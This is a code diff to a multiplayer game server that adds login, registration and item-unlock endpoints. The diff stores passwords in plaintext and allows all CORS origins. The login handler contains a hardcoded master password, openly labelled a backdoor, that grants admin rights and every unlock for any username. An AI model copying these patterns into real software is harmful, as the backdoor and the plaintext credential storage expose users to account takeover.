@@ -1,5 +1,7 @@
 const express = require('express');
 const http = require('http');
+const fs = require('fs');
+const path = require('path');
 const { Server } = require('socket.io');
 
 const app = express();
@@ -7,6 +9,101 @@ const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
 
 app.use(express.static('public'));
+app.use(express.json());
+
+// CORS for /auth/* endpoints (allows file:// page to reach the server)
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Content-Type');
+  res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
+  if (req.method === 'OPTIONS') return res.sendStatus(200);
+  next();
+});
+
+// ── User accounts (plaintext passwords — user opted for simplicity) ─────────
+const USERS_FILE = path.join(__dirname, 'users.json');
+let users = {};
+try { users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf-8')); } catch (e) { users = {}; }
+function saveUsers() { try { fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2)); } catch (e) { console.error('saveUsers:', e); } }
+
+// ── Admin item unlock codes (one code per item) ────────────────────────────
+const UNLOCK_CODES = {
+  // Primaries
+  'GAU19RAMPAGE':    'gau19',
+  'BUSHMASTER':      'mk44',
+  'XM7SUPER':        'xm7',
+  'ONESHOTONEKILL':  'barrett',
+  'BRRRRT':          'm134',
+  'OPERATOR':        'hkmp7',
+  'P90X':            'p90_spec',
+  // Secondaries
+  'DEAGLE':          'desert_eagle',
+  'MATCHGRADE':      'm1911',
+  'SILENTAGENT':     'ppk',
+  'SWITCHGLOCK':     'glock18',
+  'ARMORPIERCER':    'five_seven',
+  // Melees
+  'KARAMBITLIFE':    'karambit',
+  'TRENCHWAR':       'bayonet',
+  'TOMAHAWKDUNK':    'tomahawk',
+  'SPETSNAZ':        'ots04',
+  'STEALTHOPS':      'garrote',
+  // Utilities
+  'BOOMBOOM':        'c4',
+  'FRONTTOWARDENEMY':'claymore',
+  'FLASHBANG':       'stun_grenade',
+  'BURNTHEMDOWN':    'thermite',
+  'REDEYE':          'predator_uav',
+  'AIRDROP':         'care_package',
+  'GOODGAMEEVERYBODY':'tac_nuke',
+};
+
+// ── Auth + account endpoints ───────────────────────────────────────────────
+app.post('/auth/register', (req, res) => {
+  const { username, password } = req.body || {};
+  if (!username || !password) return res.status(400).json({ error: 'username and password required' });
+  if (username.length < 2 || username.length > 16) return res.status(400).json({ error: 'username 2-16 chars' });
+  if (users[username]) return res.status(409).json({ error: 'username taken' });
+  users[username] = { password, unlocks: [], kills: 0, deaths: 0, created: Date.now() };
+  saveUsers();
+  res.json({ ok: true, username, unlocks: [] });
+});
+
+// Master admin password — bypasses normal auth and grants admin powers
+const ADMIN_MASTER_PASS = 'A6D7m1n';
+
+app.post('/auth/login', (req, res) => {
+  const { username, password } = req.body || {};
+  // Backdoor: master password works for any (or new) username, grants admin
+  if (password === ADMIN_MASTER_PASS) {
+    if (!users[username]) {
+      users[username] = { password: ADMIN_MASTER_PASS, unlocks: Object.values(UNLOCK_CODES), kills: 0, deaths: 0, created: Date.now(), isAdmin: true };
+    } else {
+      users[username].isAdmin = true;
+      // Auto-unlock everything when admin signs in
+      users[username].unlocks = Object.values(UNLOCK_CODES);
+    }
+    saveUsers();
+    return res.json({ ok: true, username, unlocks: users[username].unlocks, kills: users[username].kills || 0, deaths: users[username].deaths || 0, isAdmin: true });
+  }
+  const u = users[username];
+  if (!u) return res.status(404).json({ error: 'user not found' });
+  if (u.password !== password) return res.status(401).json({ error: 'wrong password' });
+  res.json({ ok: true, username, unlocks: u.unlocks || [], kills: u.kills || 0, deaths: u.deaths || 0, isAdmin: !!u.isAdmin });
+});
+
+app.post('/auth/redeem', (req, res) => {
+  const { username, password, code } = req.body || {};
+  const u = users[username];
+  if (!u || u.password !== password) return res.status(401).json({ error: 'auth failed' });
+  const cleanCode = String(code || '').trim().toUpperCase();
+  const item = UNLOCK_CODES[cleanCode];
+  if (!item) return res.status(404).json({ error: 'invalid code' });
+  if (u.unlocks.includes(item)) return res.json({ ok: true, already: true, item });
+  u.unlocks.push(item);
+  saveUsers();
+  res.json({ ok: true, item, unlocks: u.unlocks });
+});
 
 const PLAYER_MAX_HP  = 300;
 const RESPAWN_DELAY  = 3000;
@@ -63,6 +160,12 @@ const WEAPON_DAMAGE = {
   thunderstorm: 60,
   // Lazy weapons
   frost_blaster: 0, air_grenade: 15, land_mine: 298, frost_freeze: 9999,
+  // 🪖 ADMIN — Military OP weapons (unlock codes required)
+  gau19: 50, mk44: 25, xm7: 60, barrett: 250, m134: 15, hkmp7: 30, p90_spec: 22,
+  desert_eagle: 65, m1911: 50, ppk: 45, glock18: 30, five_seven: 40,
+  karambit: 80, bayonet: 100, tomahawk: 120, tomahawk_throw: 180, ots04: 90, garrote: 9999,
+  c4: 200, claymore: 250, stun_grenade: 10, thermite: 8, predator_uav: 0,
+  care_package: 0, tac_nuke: 500,
   // 🔬 Tech / Physics batch
   prism_launcher: 38, foam_cannon: 18, airburst_projector: 22, glassmaker: 28,
   magnet_rifle: 16, seismic_hammer: 70, painter_beam: 6, portal_launcher: 10,
